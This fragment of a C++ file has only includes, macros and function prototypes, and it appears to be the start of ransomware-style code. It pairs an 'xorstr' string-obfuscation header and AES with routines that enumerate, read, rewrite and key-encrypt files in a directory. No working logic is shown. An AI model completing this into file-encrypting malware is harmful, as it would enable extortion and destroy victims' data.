#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include "xorstr.h"
#include "AES.h"
using namespace std;
namespace fs = filesystem;
// our console filename
#define ourFilename xorstr_("THE FILENAME OF UR CONSOLE")
#define testingDir xorstr_("TESTING DIRECTORY PATH")

vector<std::byte> getBytes(std::string const& s);
string getAllFiles(string path);
string OpenReadFile(string path);
void OpenWriteFile(string path, string input);
void GenerateAESkey(string filename, std::size_t len);
void CreateFileList(string dir, string output);
void WriteDirectory(string path);
